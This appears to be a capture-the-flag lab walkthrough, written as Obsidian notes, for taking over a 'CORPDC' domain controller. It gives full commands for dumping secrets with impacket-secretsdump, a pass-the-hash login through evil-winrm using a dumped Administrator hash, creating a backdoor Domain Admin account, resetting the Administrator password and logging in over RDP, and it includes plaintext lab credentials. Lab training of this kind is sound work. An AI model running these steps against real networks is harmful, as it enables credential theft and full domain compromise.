
## With svcBackups
Perform the same technique and dump secrets from the CORPDC machine, we will use the `svcBackups` account.

## Dump hashes on the `Server1` machine

$ `proxychains -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@10.200.113.102`

![[Dumping secrets from CORPDC-20240601064020744.webp]]

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::

## Connect using `evil-winrm`

$ `proxychains4 /usr/bin/evil-winrm -u Administrator -H d3d4edcc015856e386074795aea86b3e -i 10.200.113.102`

![[Dumping secrets from CORPDC-20240602155726615.webp]]

You'll get a shell.
Check out the hostname.

Evil-WinRM PS C:\Users\Administrator\Documents> `hostname`

![[Dumping secrets from CORPDC-20240602160026969.webp]]

### Create a new user as an Administrator

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos K41r@s123 /add /domain`

Username: kairos
Password:  K41r@s123

### Enumerate the groups to find the group name for the Administrator user

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group`

![[Dumping secrets from CORPDC-20240604135830320.webp]]

### Add the new user to this group to make him the `Domain Admin`.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net group "Domain Admins" kairos /add /domain`

### Display user's information


The `net user` command is a Windows command-line utility that can be used to display or modify user account information. The `/domain` switch is used with `net user` to specify that the operation should be performed on a domain controller, allowing you to view or change user account information in a domain environment.

Evil-WinRM* PS C:\Users\Administrator\Documents> `net user kairos /domain`

![[Dumping secrets from CORPDC-20240604140856658.webp]]

## Connect to RDP

$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:kairos /p:K41r@s123` 

### Getting flag 7
[[Flag Submission Process]]


## Change the Administrator's password.
Even though you are a member of Domain Admins group, you can access the Administrator's directoroy.


Evil-WinRM* PS C:\Users\Administrator\Documents> `net user Administrator Hacker@123 /domain`

#### Connect to RDP with the Administrator's credentials

$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:Administrator /p:Hacker@123 

### Getting flag 8

[[Flag Submission Process]]
